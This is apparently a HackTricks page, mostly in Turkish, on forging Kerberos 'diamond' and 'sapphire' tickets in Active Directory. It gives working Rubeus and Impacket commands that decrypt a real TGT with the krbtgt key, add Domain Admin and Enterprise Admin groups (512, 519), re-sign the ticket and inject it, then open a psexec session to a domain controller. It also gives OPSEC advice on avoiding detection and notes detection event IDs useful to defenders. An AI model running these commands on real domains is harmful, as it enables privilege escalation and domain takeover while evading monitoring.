# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**Like a golden ticket**, a diamond ticket bir TGT'dir ve **herhangi bir kullanıcı olarak herhangi bir servise erişmek** için kullanılabilir. Bir golden ticket tamamen çevrimdışı olarak sahte olarak oluşturulur, o etki alanının krbtgt hash'i ile şifrelenir ve kullanım için bir oturum açma oturumuna enjekte edilir. Etki alanı denetleyicileri yasal olarak verdikleri TGT'leri takip etmedikleri için, kendi krbtgt hash'leriyle şifrelenen TGT'leri memnuniyetle kabul ederler.

Golden ticket kullanımını tespit etmek için iki yaygın teknik vardır:

- Karşılık gelen bir AS-REQ olmayan TGS-REQ'leri arayın.
- Mimikatz'ın varsayılan 10 yıllık geçerlilik süresi gibi saçma değerlere sahip TGT'leri arayın.

A **diamond ticket**, **DC tarafından verilmiş meşru bir TGT'nin alanlarını değiştirmek** suretiyle oluşturulur. Bu, bir **TGT** isteyip, onu etki alanının krbtgt hash'i ile **şifre çözerek**, bilettin istenen alanlarını **değiştirip**, sonra yeniden **şifreleyerek/imzalayarak** gerçekleştirilir. Bu, bir golden ticket'in yukarıda bahsedilen iki dezavantajını **aşar** çünkü:

- TGS-REQ'lerin öncesinde bir AS-REQ olacaktır.
- TGT bir DC tarafından verildiği için domain'in Kerberos politikasından gelen tüm doğru detaylara sahip olacaktır. Bu bilgiler bir golden ticket'te doğru şekilde taklit edilebilse de, bu daha karmaşıktır ve hataya açıktır.

### Gereksinimler & iş akışı

- **Cryptographic material**: TGT'yi deşifre etmek ve yeniden imzalamak için krbtgt AES256 anahtarı (tercih edilen) veya NTLM hash.
- **Legitimate TGT blob**: `/tgtdeleg`, `asktgt`, `s4u` ile veya ticket'ları bellekten dışa aktararak elde edilir.
- **Context data**: hedef kullanıcı RID, grup RID/SID'leri ve (isteğe bağlı) LDAP'tan türetilmiş PAC öznitelikleri.
- **Service keys** (sadece service ticket'ları yeniden oluşturmayı planlıyorsanız): taklit edilecek servis SPN'nin AES anahtarı.

1. AS-REQ yoluyla kontrolünüzdeki herhangi bir kullanıcı için bir TGT elde edin (Rubeus `/tgtdeleg` kullanışlıdır çünkü istemciyi kimlik bilgisi olmadan Kerberos GSS-API akışını gerçekleştirmeye zorlar).
2. Dönen TGT'yi krbtgt anahtarıyla şifre çözün, PAC özniteliklerini yamalayın (kullanıcı, gruplar, oturum açma bilgileri, SID'ler, cihaz iddiaları vb.).
3. Aynı krbtgt anahtarıyla bileti yeniden şifreleyin/imzalayın ve mevcut oturum açma oturumuna enjekte edin (`kerberos::ptt`, `Rubeus.exe ptt`...).
4. İsteğe bağlı olarak, ağ üzerinde daha gizli kalmak için geçerli bir TGT blob'u ve hedef servis anahtarını sağlayarak aynı işlemi bir service ticket üzerinde tekrarlayın.

### Updated Rubeus tradecraft (2024+)

Son zamanlarda Huntress tarafından yapılan çalışmalar, Rubeus içindeki `diamond` eylemini modernize ederek daha önce sadece golden/silver ticket'lar için var olan `/ldap` ve `/opsec` iyileştirmelerini taşıdı. `/ldap` artık AD'den (user profile, logon hours, sidHistory, domain policies) doğru PAC özniteliklerini otomatik dolduruyor; `/opsec` ise iki aşamalı pre-auth dizisini gerçekleştirip yalnızca AES kriptografisini zorunlu kılarak AS-REQ/AS-REP akışını bir Windows istemcisinden ayırt edilemez hale getiriyor. Bu, boş cihaz kimlikleri veya gerçekçi olmayan geçerlilik pencereleri gibi bariz göstergeleri önemli ölçüde azaltır.
```powershell
# Query RID/context data (PowerView/SharpView/AD modules all work)
Get-DomainUser -Identity <username> -Properties objectsid | Select-Object samaccountname,objectsid

# Craft a high-fidelity diamond TGT and inject it
./Rubeus.exe diamond /tgtdeleg \
/ticketuser:svc_sql /ticketuserid:1109 \
/groups:512,519 \
/krbkey:<KRBTGT_AES256_KEY> \
/ldap /ldapuser:MARVEL\loki /ldappassword:Mischief$ \
/opsec /nowrap
```
- `/ldap` (with optional `/ldapuser` & `/ldappassword`) AD ve SYSVOL'a sorgu gönderir ve hedef kullanıcının PAC politika verilerini aynalar.
- `/opsec` Windows-benzeri bir AS-REQ yeniden denemesi zorlar, gürültülü bayrakları sıfırlar ve yalnızca AES256 kullanır.
- `/tgtdeleg` kurbanın açık metin şifresine veya NTLM/AES anahtarına dokunmadan yine de çözülebilir bir TGT döndürür.

### Service-ticket recutting

Aynı Rubeus güncellemesi, diamond tekniğini TGS blob'larına uygulama yeteneğini ekledi. `diamond`'a bir **base64-encoded TGT** (`asktgt`, `/tgtdeleg` veya önceden oluşturulmuş bir TGT'den), **service SPN**, ve **service AES key** vererek, KDC'ye dokunmadan gerçekçi service tickets oluşturabilirsiniz — pratikte daha sinsi bir silver ticket.
```powershell
./Rubeus.exe diamond \
/ticket:<BASE64_TGT_OR_KRB-CRED> \
/service:cifs/dc01.lab.local \
/servicekey:<AES256_SERVICE_KEY> \
/ticketuser:svc_sql /ticketuserid:1109 \
/ldap /opsec /nowrap
```
Bu iş akışı, zaten bir servis hesabı anahtarını kontrol ettiğinizde (ör. `lsadump::lsa /inject` veya `secretsdump.py` ile dump edilmiş) ve yeni herhangi bir AS/TGS trafiği oluşturmadan AD politikası, zaman çizelgeleri ve PAC verileriyle tam olarak eşleşen tek seferlik bir TGS kesmek istediğinizde idealdir.

### Sapphire-style PAC swaps (2025)

Daha yeni bir varyant, bazen **sapphire ticket** olarak adlandırılan, Diamond'ın "real TGT" tabanını **S4U2self+U2U** ile birleştirerek ayrıcalıklı bir PAC'i çalar ve kendi TGT'nize yerleştirir. Ek SID'ler icat etmek yerine yüksek ayrıcalıklı bir kullanıcı için bir U2U S4U2self bileti talep eder, o PAC'i çıkarır ve krbtgt anahtarıyla yeniden imzalamadan önce meşru TGT'nize ekler. U2U `ENC-TKT-IN-SKEY` ayarladığı için, ortaya çıkan ağ akışı meşru bir kullanıcıdan-kullanıcıya değişimi gibi görünür.

Minimal Linux tarafı yeniden üretimi, Impacket'in yaması uygulanmış `ticketer.py` ile (sapphire desteği ekler):
```bash
python3 ticketer.py -request -impersonate 'DAuser' \
-domain 'lab.local' -user 'lowpriv' -password 'Passw0rd!' \
-aesKey '<krbtgt_aes256>' -domain-sid 'S-1-5-21-111-222-333' \
--u2u --s4u2self
# inject resulting .ccache
export KRB5CCNAME=lowpriv.ccache
python3 psexec.py lab.local/DAuser@dc.lab.local -k -no-pass
```
Bu varyantı kullanırken önemli OPSEC işaretleri:

- TGS-REQ, `ENC-TKT-IN-SKEY` ve `additional-tickets` (hedef TGT) taşır — normal trafikte nadir görülür.
- `sname` sıklıkla istekte bulunan kullanıcıya eşittir (kendi kendine erişim) ve Event ID 4769 çağıran ile hedefin aynı SPN/kullanıcı olduğunu gösterir.
- Aynı istemci bilgisayarıyla fakat farklı CNAMES içeren eşleşmiş 4768/4769 kayıtları bekleyin (düşük ayrıcalıklı istek sahibi vs. ayrıcalıklı PAC sahibi).

### OPSEC ve tespit notları

- Geleneksel avcı heuristikleri (AS olmadan TGS, on yıllık yaşam süreleri) golden ticket'larda hâlâ geçerlidir, ancak diamond ticket'lar esas olarak **PAC içeriği veya grup eşlemesi imkansız görünüyorsa** ortaya çıkar. Otomatik karşılaştırmalar sahteliği hemen işaretlemesin diye her PAC alanını (oturum saatleri, kullanıcı profil yolları, cihaz kimlikleri) doldurun.
- **Grupları/RID'leri gereğinden fazla atamayın**. Sadece `512` (Domain Admins) ve `519` (Enterprise Admins) gerekiyorsa, orada durun ve hedef hesabın AD'nin başka yerlerinde makul şekilde bu gruplara ait göründüğünden emin olun. Aşırı `ExtraSids` ele verir.
- Sapphire-style swaps U2U parmak izleri bırakır: `ENC-TKT-IN-SKEY` + `additional-tickets` + `sname == cname` 4769'da ve sahte biletten kaynaklanan takip eden bir 4624 oturumu. Sadece no-AS-REQ gaps aramasına odaklanmak yerine bu alanları ilişkilendirin.
- Microsoft, CVE-2026-20833 nedeniyle **RC4 service ticket issuance**'ı aşamalı olarak kaldırmaya başladı; KDC'de yalnızca AES etype'larını zorunlu kılmak hem domaini güçlendirir hem de diamond/sapphire araçlarıyla uyum sağlar (/opsec zaten AES'i zorunlu kılar). RC4'ü sahte PAC'lere karıştırmak giderek daha fazla göze batacaktır.
- Splunk'ın Security Content projesi, diamond ticket'lar için attack-range telemetry ve *Windows Domain Admin Impersonation Indicator* gibi tespitler dağıtır; bu tespit alışılmadık Event ID 4768/4769/4624 dizilerini ve PAC grup değişikliklerini korele eder. Bu veri setini yeniden oynatmak (veya yukarıdaki komutlarla kendinize aitini üretmek) T1558.001 için SOC kapsamını doğrulamaya yardımcı olur ve kaçınmanız gereken somut alarm mantığı sağlar.

## References

- [Huntress – Recutting the Kerberos Diamond Ticket (2025)](https://www.huntress.com/blog/recutting-the-kerberos-diamond-ticket)
- [Splunk Security Content – Diamond Ticket attack data & detections (2023)](https://research.splunk.com/attack_data/be469518-9d2d-4ebb-b839-12683cd18a7c/)
- [Хабр – Теневая сторона драгоценностей: Diamond & Sapphire Ticket (2025)](https://habr.com/ru/articles/891620/)
- [Microsoft – RC4 service ticket enforcement for CVE-2026-20833](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
